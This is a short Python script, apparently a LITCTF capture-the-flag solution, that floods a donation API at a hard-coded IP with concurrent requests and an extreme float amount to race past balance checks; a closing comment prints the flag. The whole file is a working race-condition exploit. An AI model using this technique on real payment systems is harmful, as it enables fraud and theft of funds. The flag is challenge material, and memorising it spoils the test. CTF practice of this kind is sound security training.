import asyncio
import time

import aiohttp


BASE_URL = "http://34.130.180.82:53082"
DONATE_URL = f"{BASE_URL}/api/donate"


async def donate(session, fund: str, money: float):
    payload = dict()
    payload["fund"] = fund
    payload["amount"] = money
    async with session.post(url=DONATE_URL, json=payload) as response:
        resp = await response.read()
        if "not enough money in account" not in resp.decode():
            print(resp.decode())

async def get_balance(session):
    async with session.get(url=f"{BASE_URL}/api/balance") as response:
        resp = await response.read()
        print(resp.decode())


async def main():
    async with aiohttp.ClientSession() as session:
        await get_balance(session)

        for _ in range(10):
            await asyncio.gather(*[
                get_balance(session) if i % 100 == 0
                else donate(session, "codetigerorz", 90071992547409.91)
                for i in range(100)])
            time.sleep(0.1)


if __name__ == '__main__':
    asyncio.run(main())


# pay for the flag manually via website
# LITCTF{emeraldblock_orzzzz}
